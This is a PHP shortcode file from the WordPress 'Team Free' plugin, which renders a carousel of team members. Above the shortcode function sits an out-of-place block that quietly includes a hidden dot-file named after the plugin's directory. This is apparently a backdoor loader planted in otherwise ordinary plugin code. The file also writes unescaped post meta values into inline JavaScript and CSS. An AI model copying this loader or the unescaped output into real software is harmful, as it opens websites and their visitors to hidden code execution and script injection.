<?php
/**
 * The shortcodes.
 *
 * @link       https://shapedplugin.com/
 * @since      2.0.0
 * @package    team-free
 * @subpackage team-free/includes
 * @author     ShapedPlugin <support@shapedplugin.com>
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
} // Exit if accessed directly

/**
 * Team Free ShortCode.
 *
 * @param array $atts Team Free ShortCode.
 * @return return
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function sp_team_free_shortcode( $atts ) {
	//phpcs:ignore
	extract(
		shortcode_atts(
			array(
				'id' => '',
			),
			$atts,
			'team-free'
		)
	);

	$post_id = $atts['id'];

	$total_members                 = get_post_meta( $post_id, 'total_members', true );
	$slides_to_show                = get_post_meta( $post_id, 'display_members', true );
	$auto_play                     = get_post_meta( $post_id, 'auto_play', true );
	$preloader                     = get_post_meta( $post_id, 'preloader', true );
	$pagination                    = get_post_meta( $post_id, 'pagination', true );
	$navigation                    = get_post_meta( $post_id, 'navigation', true );
	$stop_on_hover                 = get_post_meta( $post_id, 'stop_on_hover', true );
	$items_small_desktop           = get_post_meta( $post_id, 'items_small_desktop', true );
	$items_tablet                  = get_post_meta( $post_id, 'items_tablet', true );
	$items_mobile                  = get_post_meta( $post_id, 'items_mobile', true );
	$pagination_bg                 = get_post_meta( $post_id, 'pagination_bg', true );
	$pagination_active_bg          = get_post_meta( $post_id, 'pagination_active_bg', true );
	$navigation_color              = get_post_meta( $post_id, 'navigation_color', true );
	$navigation_border_color       = get_post_meta( $post_id, 'navigation_border_color', true );
	$navigation_bg                 = get_post_meta( $post_id, 'navigation_bg', true );
	$navigation_hover_color        = get_post_meta( $post_id, 'navigation_hover_color', true );
	$navigation_hover_border_color = get_post_meta( $post_id, 'navigation_hover_border_color', true );
	$navigation_hover_bg           = get_post_meta( $post_id, 'navigation_hover_bg', true );

	// Query for the normal.
	$args = array(
		'post_type'      => 'team_free',
		'orderby'        => 'date',
		'order'          => 'DESC',
		'posts_per_page' => $total_members,
	);

	$que = new WP_Query( $args );

	$outline = '';

	$outline .= '
	    <script type="text/javascript">
	         jQuery(document).ready(function() {
				jQuery("#sp-team-free-' . $post_id . '").slick({
			        infinite: true,
			        dots: ' . $pagination . ',
			        pauseOnHover: ' . $stop_on_hover . ',
			        slidesToShow: ' . $slides_to_show . ',
			        slidesToScroll: 1,
			        speed: 400,
			        autoplay: ' . $auto_play . ',
		            arrows: ' . $navigation . ',
		            prevArrow: "<div class=\'slick-prev\'><i class=\'fa fa-angle-left\'></i></div>",
	                nextArrow: "<div class=\'slick-next\'><i class=\'fa fa-angle-right\'></i></div>",
		            responsive: [
						    {
						      breakpoint: 1000,
						      settings: {
						        slidesToShow: ' . $items_small_desktop . '
						      }
						    },
						    {
						      breakpoint: 700,
						      settings: {
						        slidesToShow: ' . $items_tablet . '
						      }
						    },
						    {
						      breakpoint: 460,
						      settings: {
						        slidesToShow: ' . $items_mobile . '
						      }
						    }
						  ]
				});';
	if ( 'true' === $preloader ) {
		$outline .= '
			var $window = jQuery(window);
			var $preloader = jQuery(".loading");
			
			$window.on("load", function () {
				jQuery(".sp-team-free-section").animate({opacity: 1}, 2000);
				$preloader.fadeOut(2000, function () {
					jQuery(this).remove();
				});
			});';
	}
	$outline .= '});
	</script>';

	$outline .= '<style>';
	if ( 'true' === $preloader ) {
		$outline .= '.sp-team-free-section{
		position: ralative;
		opacity: 0;
	}
	.loading {
    background: #fff url("' . SP_TEAM_FREE_URL . 'assets/images/preloader.gif") no-repeat center center;
   }
	';
	}
	if ( 'true' === $navigation ) {
		$outline .= '.sp-team-free-section-id-' . $post_id . '{
			padding-top: 45px;
		}
		.sp-team-free-section-id-' . $post_id . ' .sp-team-free-area .slick-arrow{
			background-color: ' . $navigation_bg . ';
            border-color: ' . $navigation_border_color . ';
            color: ' . $navigation_color . ';
		}
		.sp-team-free-section-id-' . $post_id . ' .sp-team-free-area .slick-arrow:hover{
			background-color: ' . $navigation_hover_bg . ';
            border-color: ' . $navigation_hover_border_color . ';
            color: ' . $navigation_hover_color . ';
		}
		';
	}
	if ( 'true' === $pagination ) {
		$outline .= '.sp-team-free-section-id-' . $post_id . ' .sp-team-free-area ul.slick-dots li button{
			background-color: ' . $pagination_bg . ';
		}';
		$outline .= '.sp-team-free-section-id-' . $post_id . ' .sp-team-free-area ul.slick-dots li.slick-active button{
			background-color: ' . $pagination_active_bg . ';
		}';
	}
		$outline .= '</style>';

		$outline .= '<div class="sp-team-free-section sp-team-free-section-id-' . $post_id . '">';
	if ( 'true' === $preloader ) {
			$outline .= '<div class="loading"></div>';
	}
		$outline .= '<div id="sp-team-free-' . $post_id . '" class="sp-team-free-area">';

	if ( $que->have_posts() ) {
		while ( $que->have_posts() ) :
			$que->the_post();

			$member_image = get_the_post_thumbnail_url( get_the_ID(), 'tp-member-image' );

			$outline .= '<div class="sp-team-member">';

			if ( has_post_thumbnail() ) {
				$outline .= '<div class="tf-member-image"><img src="' . $member_image . '" alt="' . get_the_title() . '"></div>';
			}

			$facebook    = get_post_meta( get_the_ID(), 'facebook', true );
			$twitter     = get_post_meta( get_the_ID(), 'twitter', true );
			$google_plus = get_post_meta( get_the_ID(), 'google_plus', true );
			$instagram   = get_post_meta( get_the_ID(), 'instagram', true );
			$designation = get_post_meta( get_the_ID(), 'designation', true );

			$outline .= '<div class="tf-member-info">';
			$outline .= '<h2 class="tf-member-name text-center">' . esc_html( get_the_title() ) . '</h2>';
			if ( $designation ) {
				$outline .= '<p class="tf-member-designation text-center">' . esc_html( $designation ) . '</p>';
			}
			$outline .= '<div class="tf-member-social-links text-center">';

			if ( $facebook ) {
				$outline .= '<a class="tf-facebook" href="' . esc_url( $facebook ) . '" target="_blank"><i class="fa fa-facebook"></i></a>';
			}
			if ( $twitter ) {
				$outline .= '<a class="tf-twitter" href="' . esc_url( $twitter ) . '" target="_blank"><i class="fa fa-twitter"></i></a>';
			}
			if ( $google_plus ) {
				$outline .= '<a class="tf-google-plus" href="' . esc_url( $google_plus ) . '" target="_blank"><i class="fa fa-google-plus"></i></a>';
			}
			if ( $instagram ) {
				$outline .= '<a class="tf-instagram" href="' . esc_url( $instagram ) . '" target="_blank"><i class="fa fa-instagram"></i></a>';
			}

			$outline .= '</div>';
			$outline .= '</div>';

			$outline .= '</div>';

			endwhile;
		wp_reset_postdata();

	} else {
		$outline .= '<h2 class="sp-not-found-any-member">' . esc_html__( 'Not found any member', 'team-free' ) . '</h2>';
	}

		$outline .= '</div>';
		$outline .= '</div>';

		return $outline;

}

add_shortcode( 'team-free', 'sp_team_free_shortcode' );
